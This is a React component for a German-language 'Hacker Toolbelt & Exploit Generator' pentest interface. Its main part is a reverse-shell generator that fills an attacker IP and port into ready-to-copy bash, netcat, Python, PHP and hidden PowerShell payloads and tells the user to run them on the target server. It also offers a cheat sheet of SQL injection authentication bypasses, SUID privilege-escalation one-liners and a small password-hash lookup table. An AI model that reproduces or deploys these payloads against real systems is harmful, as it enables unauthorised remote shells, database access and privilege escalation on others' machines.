import React, { useState } from 'react';
import { Copy, Check, Terminal, Key, Code, ShieldAlert, Cpu } from 'lucide-react';

export const ToolbeltView: React.FC = () => {
  const [activeTool, setActiveTool] = useState<'revshell' | 'encoder' | 'hasher' | 'cheatsheet'>('revshell');

  // RevShell State
  const [lhost, setLhost] = useState('10.10.14.25');
  const [lport, setLport] = useState('4444');
  const [shellType, setShellType] = useState<'bash' | 'nc_mkfifo' | 'python' | 'php' | 'powershell'>('bash');
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  // Encoder State
  const [encodeInput, setEncodeInput] = useState('RootForge unbounded');
  const [encodeMode, setEncodeMode] = useState<
    'b64_enc' | 'b64_dec' | 'url_enc' | 'url_dec' | 'rot13' | 'hex_enc' | 'hex_dec'
  >('b64_enc');

  // Hasher State
  const [hashInput, setHashInput] = useState('5f4dcc3b5aa765d61d8327deb882cf99');
  const [crackResult, setCrackResult] = useState<string | null>(null);

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // Generate reverse shell commands
  const getShellPayload = () => {
    switch (shellType) {
      case 'bash':
        return `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
      case 'nc_mkfifo':
        return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`;
      case 'python':
        return `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`;
      case 'php':
        return `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`;
      case 'powershell':
        return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      default:
        return '';
    }
  };

  // Encoder operations
  const processEncoding = (input: string, mode: string): string => {
    try {
      if (mode === 'b64_enc') {
        return btoa(unescape(encodeURIComponent(input)));
      }
      if (mode === 'b64_dec') {
        return decodeURIComponent(escape(atob(input.trim())));
      }
      if (mode === 'url_enc') {
        return encodeURIComponent(input);
      }
      if (mode === 'url_dec') {
        return decodeURIComponent(input);
      }
      if (mode === 'rot13') {
        return input.replace(/[a-zA-Z]/g, (c) => {
          const code = c.charCodeAt(0);
          const base = code >= 97 ? 97 : 65;
          return String.fromCharCode(((code - base + 13) % 26) + base);
        });
      }
      if (mode === 'hex_enc') {
        return Array.from(input)
          .map((c) => c.charCodeAt(0).toString(16).padStart(2, '0'))
          .join('');
      }
      if (mode === 'hex_dec') {
        const clean = input.replace(/\s+/g, '');
        let str = '';
        for (let i = 0; i < clean.length; i += 2) {
          str += String.fromCharCode(parseInt(clean.substr(i, 2), 16));
        }
        return str;
      }
      return input;
    } catch {
      return '[Error: Invalid input format for selected transformation]';
    }
  };

  // Hash identification & cracking
  const identifyHash = (h: string) => {
    const clean = h.trim();
    if (clean.length === 32) return 'MD5 or NTLM (32 hex characters / 128-bit)';
    if (clean.length === 40) return 'SHA-1 (40 hex characters / 160-bit)';
    if (clean.length === 64) return 'SHA-256 (64 hex characters / 256-bit)';
    if (clean.startsWith('$2a$') || clean.startsWith('$2b$') || clean.startsWith('$2y$')) {
      return 'Bcrypt Blowfish ($2a/$2b)';
    }
    if (clean.startsWith('$6$')) return 'SHA-512 Unix Shadow Hash ($6$)';
    return 'Unknown or custom hash format';
  };

  const handleCrackHash = () => {
    const clean = hashInput.trim().toLowerCase();
    const rainbowMap: Record<string, string> = {
      '5f4dcc3b5aa765d61d8327deb882cf99': 'password',
      '098f6bcd4621d373cade4e832627b4f6': 'test',
      '21232f297a57a5a743894a0e4a801fc3': 'admin',
      'e10adc3949ba59abbe56e057f20f883e': '123456',
      '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8': 'password',
    };

    if (rainbowMap[clean]) {
      setCrackResult(`Treffer in RockYou Wordlist: "${rainbowMap[clean]}"`);
    } else {
      setCrackResult('Kein Treffer in den Top 10.000 Passwörtern. Nutze Hashcat mit GPU-Wordlists.');
    }
  };

  return (
    <div className="space-y-6">
      {/* Title */}
      <div>
        <h1 className="text-2xl font-bold text-white tracking-tight">Hacker Toolbelt & Exploit Generator</h1>
        <p className="text-sm text-slate-400 mt-1">
          Essenzielle Werkzeuge für Penetrationstests, Reverse-Shell Generierung, Encodings und Hash-Analyse.
        </p>
      </div>

      {/* Tool Tabs */}
      <div className="flex items-center gap-2 border-b border-slate-800 pb-2 text-xs overflow-x-auto">
        <button
          onClick={() => setActiveTool('revshell')}
          className={`px-3 py-1.5 rounded-lg font-medium transition-colors flex items-center gap-1.5 whitespace-nowrap shrink-0 ${
            activeTool === 'revshell'
              ? 'bg-emerald-500 text-slate-950 font-semibold'
              : 'text-slate-400 hover:text-white hover:bg-slate-900'
          }`}
        >
          <Terminal className="w-3.5 h-3.5" />
          <span>Reverse Shell Generator</span>
        </button>

        <button
          onClick={() => setActiveTool('encoder')}
          className={`px-3 py-1.5 rounded-lg font-medium transition-colors flex items-center gap-1.5 whitespace-nowrap shrink-0 ${
            activeTool === 'encoder'
              ? 'bg-emerald-500 text-slate-950 font-semibold'
              : 'text-slate-400 hover:text-white hover:bg-slate-900'
          }`}
        >
          <Code className="w-3.5 h-3.5" />
          <span>CyberChef Encoder / Decoder</span>
        </button>

        <button
          onClick={() => setActiveTool('hasher')}
          className={`px-3 py-1.5 rounded-lg font-medium transition-colors flex items-center gap-1.5 whitespace-nowrap shrink-0 ${
            activeTool === 'hasher'
              ? 'bg-emerald-500 text-slate-950 font-semibold'
              : 'text-slate-400 hover:text-white hover:bg-slate-900'
          }`}
        >
          <Key className="w-3.5 h-3.5" />
          <span>Hash Identifier & Cracker</span>
        </button>

        <button
          onClick={() => setActiveTool('cheatsheet')}
          className={`px-3 py-1.5 rounded-lg font-medium transition-colors flex items-center gap-1.5 whitespace-nowrap shrink-0 ${
            activeTool === 'cheatsheet'
              ? 'bg-emerald-500 text-slate-950 font-semibold'
              : 'text-slate-400 hover:text-white hover:bg-slate-900'
          }`}
        >
          <ShieldAlert className="w-3.5 h-3.5" />
          <span>Exploit Cheat Sheet</span>
        </button>
      </div>

      {/* Tab 1: RevShell Generator */}
      {activeTool === 'revshell' && (
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 space-y-6">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div>
              <label className="block text-xs font-medium text-slate-300 mb-1">
                LHOST (Deine Angreifer IP)
              </label>
              <input
                type="text"
                value={lhost}
                onChange={(e) => setLhost(e.target.value)}
                className="w-full px-3 py-2 bg-slate-950 border border-slate-750 rounded-lg text-xs font-mono text-emerald-400 focus:outline-none focus:border-emerald-500"
              />
            </div>
            <div>
              <label className="block text-xs font-medium text-slate-300 mb-1">
                LPORT (Dein Netcat Listener Port)
              </label>
              <input
                type="text"
                value={lport}
                onChange={(e) => setLport(e.target.value)}
                className="w-full px-3 py-2 bg-slate-950 border border-slate-750 rounded-lg text-xs font-mono text-emerald-400 focus:outline-none focus:border-emerald-500"
              />
            </div>
            <div>
              <label className="block text-xs font-medium text-slate-300 mb-1">Shell Typ</label>
              <select
                value={shellType}
                onChange={(e) => setShellType(e.target.value as any)}
                className="w-full px-3 py-2 bg-slate-950 border border-slate-750 rounded-lg text-xs font-mono text-white focus:outline-none focus:border-emerald-500"
              >
                <option value="bash">Bash (-i)</option>
                <option value="nc_mkfifo">Netcat (mkfifo pipe)</option>
                <option value="python">Python 3 (PTY Spawn)</option>
                <option value="php">PHP (fsockopen exec)</option>
                <option value="powershell">Windows PowerShell TCP</option>
              </select>
            </div>
          </div>

          {/* Listener command preview */}
          <div className="p-4 bg-slate-950 border border-slate-800 rounded-lg space-y-2">
            <div className="flex items-center justify-between text-xs text-slate-400">
              <span className="font-semibold text-white">1. Starte deinen Listener im Terminal:</span>
              <button
                onClick={() => copyToClipboard(`nc -lvnp ${lport}`, 'listener')}
                className="flex items-center gap-1 text-emerald-400 hover:text-emerald-300"
              >
                {copiedKey === 'listener' ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                <span>Kopieren</span>
              </button>
            </div>
            <code className="block font-mono text-xs text-cyan-300 bg-slate-900 p-2.5 rounded border border-slate-800">
              nc -lvnp {lport}
            </code>
          </div>

          {/* Payload Command preview */}
          <div className="p-4 bg-slate-950 border border-slate-800 rounded-lg space-y-2">
            <div className="flex items-center justify-between text-xs text-slate-400">
              <span className="font-semibold text-white">2. Führe den Payload auf dem Zielserver aus:</span>
              <button
                onClick={() => copyToClipboard(getShellPayload(), 'payload')}
                className="flex items-center gap-1 text-emerald-400 hover:text-emerald-300"
              >
                {copiedKey === 'payload' ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                <span>Kopieren</span>
              </button>
            </div>
            <code className="block font-mono text-xs text-emerald-400 bg-slate-900 p-2.5 rounded border border-slate-800 break-all select-all">
              {getShellPayload()}
            </code>
          </div>
        </div>
      )}

      {/* Tab 2: CyberChef Encoder/Decoder */}
      {activeTool === 'encoder' && (
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 space-y-6">
          <div className="flex flex-wrap gap-2 text-xs">
            {[
              { id: 'b64_enc', label: 'Base64 Encode' },
              { id: 'b64_dec', label: 'Base64 Decode' },
              { id: 'url_enc', label: 'URL Encode' },
              { id: 'url_dec', label: 'URL Decode' },
              { id: 'rot13', label: 'ROT13' },
              { id: 'hex_enc', label: 'Hex Encode' },
              { id: 'hex_dec', label: 'Hex Decode' },
            ].map((m) => (
              <button
                key={m.id}
                onClick={() => setEncodeMode(m.id as any)}
                className={`px-3 py-1.5 rounded-lg border font-mono transition-colors ${
                  encodeMode === m.id
                    ? 'bg-emerald-500 text-slate-950 border-emerald-400 font-semibold'
                    : 'bg-slate-950 border-slate-800 text-slate-300 hover:text-white'
                }`}
              >
                {m.label}
              </button>
            ))}
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="block text-xs font-medium text-slate-300 mb-1">Eingabetext / Rohdaten</label>
              <textarea
                rows={5}
                value={encodeInput}
                onChange={(e) => setEncodeInput(e.target.value)}
                className="w-full p-3 bg-slate-950 border border-slate-750 rounded-lg text-xs font-mono text-white focus:outline-none focus:border-emerald-500 resize-none"
              />
            </div>
            <div>
              <div className="flex items-center justify-between mb-1">
                <label className="text-xs font-medium text-slate-300">Transformiertes Ergebnis</label>
                <button
                  onClick={() => copyToClipboard(processEncoding(encodeInput, encodeMode), 'encoded')}
                  className="text-xs text-emerald-400 hover:text-emerald-300 flex items-center gap-1"
                >
                  {copiedKey === 'encoded' ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>Kopieren</span>
                </button>
              </div>
              <textarea
                rows={5}
                readOnly
                value={processEncoding(encodeInput, encodeMode)}
                className="w-full p-3 bg-slate-950 border border-slate-750 rounded-lg text-xs font-mono text-emerald-400 select-all resize-none"
              />
            </div>
          </div>
        </div>
      )}

      {/* Tab 3: Hasher */}
      {activeTool === 'hasher' && (
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 space-y-6">
          <div>
            <label className="block text-xs font-medium text-slate-300 mb-1">
              Hash eingeben (MD5, SHA1, SHA256, Bcrypt)
            </label>
            <div className="flex gap-2">
              <input
                type="text"
                value={hashInput}
                onChange={(e) => {
                  setHashInput(e.target.value);
                  setCrackResult(null);
                }}
                className="flex-1 px-3 py-2 bg-slate-950 border border-slate-750 rounded-lg text-xs font-mono text-white focus:outline-none focus:border-emerald-500"
              />
              <button
                onClick={handleCrackHash}
                className="px-4 py-2 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-semibold text-xs rounded-lg transition-colors"
              >
                Wordlist Test
              </button>
            </div>
          </div>

          <div className="p-4 bg-slate-950 border border-slate-800 rounded-lg space-y-2">
            <span className="text-xs text-slate-400 block font-semibold">Erkannter Hash-Typ:</span>
            <div className="text-sm font-mono text-cyan-400 font-bold">{identifyHash(hashInput)}</div>
            <p className="text-xs text-slate-500">
              Länge: {hashInput.trim().length} Zeichen
            </p>
          </div>

          {crackResult && (
            <div className="p-4 bg-slate-950 border border-emerald-500/30 rounded-lg">
              <span className="text-xs text-slate-400 block font-semibold mb-1">Cracking Ergebnis:</span>
              <div className="text-sm font-mono text-emerald-300 font-bold">{crackResult}</div>
            </div>
          )}
        </div>
      )}

      {/* Tab 4: Exploit Cheat Sheet */}
      {activeTool === 'cheatsheet' && (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-3">
            <h3 className="text-sm font-bold text-white flex items-center gap-2">
              <ShieldAlert className="w-4 h-4 text-emerald-400" />
              <span>SQL Injection Auth Bypasses</span>
            </h3>
            <div className="space-y-1.5 font-mono text-xs text-slate-300">
              <div className="p-2 bg-slate-950 rounded border border-slate-800 select-all">
                ' OR 1=1 --
              </div>
              <div className="p-2 bg-slate-950 rounded border border-slate-800 select-all">
                admin' --
              </div>
              <div className="p-2 bg-slate-950 rounded border border-slate-800 select-all">
                ' OR '1'='1
              </div>
              <div className="p-2 bg-slate-950 rounded border border-slate-800 select-all">
                ' UNION SELECT null, version(), current_user() --
              </div>
            </div>
          </div>

          <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-3">
            <h3 className="text-sm font-bold text-white flex items-center gap-2">
              <Cpu className="w-4 h-4 text-cyan-400" />
              <span>Linux SUID PrivEsc (GTFOBins)</span>
            </h3>
            <div className="space-y-1.5 font-mono text-xs text-slate-300">
              <div className="p-2 bg-slate-950 rounded border border-slate-800 select-all">
                find . -exec /bin/sh -p \; -quit
              </div>
              <div className="p-2 bg-slate-950 rounded border border-slate-800 select-all">
                python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
              </div>
              <div className="p-2 bg-slate-950 rounded border border-slate-800 select-all">
                vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
              </div>
              <div className="p-2 bg-slate-950 rounded border border-slate-800 select-all">
                find / -perm -u=s -type f 2&gt;/dev/null
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
